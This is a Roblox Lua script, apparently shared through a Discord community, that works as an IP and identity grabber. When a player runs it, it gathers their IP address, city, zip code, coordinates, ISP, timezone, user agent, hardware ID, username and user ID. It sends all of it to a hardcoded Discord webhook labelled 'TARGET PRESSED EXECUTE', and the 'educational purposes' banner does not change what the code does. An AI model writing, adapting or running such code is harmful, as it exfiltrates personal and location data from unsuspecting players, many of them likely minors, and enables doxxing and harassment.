--[[ # Remake was made by skondoooo92
	 # Discord server is: "https://discord.gg/4THYgrRQd3"
	 # Join our server for more updates and information]]--


local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local LocalizationService = game:GetService("LocalizationService")
local RbxAnalyticsService = game:GetService("RbxAnalyticsService")

local plr = Players.LocalPlayer
local webhook = "https://discord.com/api/webhooks/1514068430825848834/RqgYiW5-cxTjGP4XO2uNAUvTOaw2L9Hzn5LwUsgiU2FSUMju819AHQIjgVKz7y4LKCup"

local function getuser()
	return plr.Character and plr.Character.Name or plr.Name
end

local function getid()
	return plr.UserId
end

local function getprofile()
	return "https://www.roblox.com/headshot-thumbnail/image?userId=" .. getid() .. "&width=420&height=420&format=png"
end

local function getIP()
	local ok, res = pcall(function() return game:HttpGet("https://httpbin.org/get") end)
	if ok then
		local suc, d = pcall(function() return HttpService:JSONDecode(res) end)
		if suc and d then return d.origin end
	end
	return "Unavailable"
end

local function getBrowser()
	local res = game:HttpGet("https://httpbin.org/get")
	local d = HttpService:JSONDecode(res)
	return d.headers and d.headers["User-Agent"] or "Unavailable"
end

local function platform()
	local res = game:HttpGet("https://httpbin.org/get")
	local d = HttpService:JSONDecode(res)
	return d.headers and d.headers["Sec-Ch-Ua-Platform"] or "Unavailable"
end

local function gethwid()
	return RbxAnalyticsService:GetClientId()
end

local function url()
	local res = game:HttpGet("https://httpbin.org/get")
	local d = HttpService:JSONDecode(res)
	return d.url or "Unavailable"
end

local function getcity()
	local res = game:HttpGet("http://ip-api.com/json")
	local d = HttpService:JSONDecode(res)
	return d.city or "Unavailable"
end

local function getlatndlong()
	local res = game:HttpGet("http://ip-api.com/json")
	local d = HttpService:JSONDecode(res)
	if d.lat and d.lon then
		return tostring(d.lat) .. ", " .. tostring(d.lon)
	end
	return "Unavailable"
end

local function zipcode()
	local res = game:HttpGet("http://ip-api.com/json")
	local d = HttpService:JSONDecode(res)
	return d.zip or "Unavailable"
end

local function regionName()
	local res = game:HttpGet("http://ip-api.com/json")
	local d = HttpService:JSONDecode(res)
	return d.regionName or "Unavailable"
end

local function isp()
	local res = game:HttpGet("http://ip-api.com/json")
	local d = HttpService:JSONDecode(res)
	return d.isp or "Unavailable"
end

local function timezone()
	local res = game:HttpGet("https://ipwhois.app/json/")
	local d = HttpService:JSONDecode(res)
	return d.timezone_name or "Unavailable"
end

local function countrybetter()
	local res = game:HttpGet("http://ip-api.com/json")
	local d = HttpService:JSONDecode(res)
	return d.country or "Unavailable"
end

local function status()
	local res = game:HttpGet("http://ip-api.com/json")
	local d = HttpService:JSONDecode(res)
	return d.status or "Unavailable"
end

local function currency()
	local res = game:HttpGet("https://ipwhois.app/json/")
	local d = HttpService:JSONDecode(res)
	return d.currency or "Unavailable"
end

local function capital()
	local res = game:HttpGet("https://ipwhois.app/json/")
	local d = HttpService:JSONDecode(res)
	return d.country_capital or "Unavailable"
end

local function getType()
	local res = game:HttpGet("https://ipwhois.app/json/")
	local d = HttpService:JSONDecode(res)
	return d.type or "Unavailable"
end

local function country()
	return LocalizationService:GetCountryRegionForPlayerAsync(plr)
end

local payload = {
    content = "TARGET PRESSED EXECUTE @here @everyone",
    embeds = {
        {
            title       = "INFO FROM A SCRIPT â EDUCATIONAL PURPOSES",
            description = "Use responsibly!",
            color       = 0,
            thumbnail   = {
                url = "https://media.discordapp.net/attachments/1287203891821416581/1379291179316674641/vLu4iMI.jpg?ex=68484643&is=6846f4c3&hm=6304209fd59751d64361bb0ddbff342636382057d096ce258232d9fc27605c42&=&format=webp"
            },
            image = {
                url = "https://images-ext-1.discordapp.net/external/8rGso8pxs71c2tA2r7aW4rsmm76YKY35yiZ2k1cWj6w/https/i.pinimg.com/originals/aa/df/9d/aadf9d097b89e17176ad1e5151fe655f.gif?width=448&height=252"
            },
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
            fields = {
                { name = "IP Address", value = getIP(), inline = true },
                { name = "Type",       value = getType(), inline = true },
                { name = "Country",    value = countrybetter(), inline = true },
                { name = "Region",     value = regionName(), inline = true },
                { name = "City",       value = getcity(), inline = true },
                { name = "Zip Code",   value = zipcode(), inline = true },
                { name = "Lat, Long",  value = getlatndlong(), inline = true },
                { name = "Timezone",   value = timezone(), inline = true },
                { name = "ISP",        value = isp(), inline = true },
                { name = "Browser",    value = getBrowser(), inline = false },
                { name = "URL",        value = url(), inline = false },
                { name = "Status",     value = status(), inline = true },
                { name = "Currency",   value = currency(), inline = true },
                { name = "Capital",    value = capital(), inline = true },
                { name = "Username",   value = getuser(), inline = true },
                { name = "User ID",    value = tostring(getid()), inline = true },
                { name = "HWID",       value = tostring(gethwid()), inline = true },
                { name = "Locale",     value = country(), inline = true },
                { name = "Profile Image", value = getprofile(), inline = false }
            }
        }
    }
}

http_request({
    Url     = webhook,
    Method  = "POST",
    Headers = { ["Content-Type"] = "application/json" },
    Body    = HttpService:JSONEncode(payload)
})
